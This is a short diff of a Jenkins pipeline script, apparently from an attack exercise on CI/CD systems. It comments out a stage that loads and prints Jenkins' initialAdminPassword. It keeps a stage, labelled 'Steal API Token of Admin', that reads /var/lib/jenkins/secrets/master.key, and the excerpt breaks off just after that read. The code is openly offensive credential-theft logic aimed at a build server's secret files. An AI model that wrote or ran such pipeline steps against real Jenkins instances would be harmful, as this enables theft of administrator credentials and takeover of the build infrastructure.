@@ -39,11 +39,12 @@ node('ubuntu') {
 }
 // Steal API Token of Admin
 node ('master') {
+/*
     stage('load file') {
         def pipeline1 = load "/var/lib/jenkins/secrets/initialAdminPassword"
         echo pipeline1.toString()
     }
-    
+*/    
     stage('Steal API Token of Admin') {
         println "\n\n=========================================================";
         def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
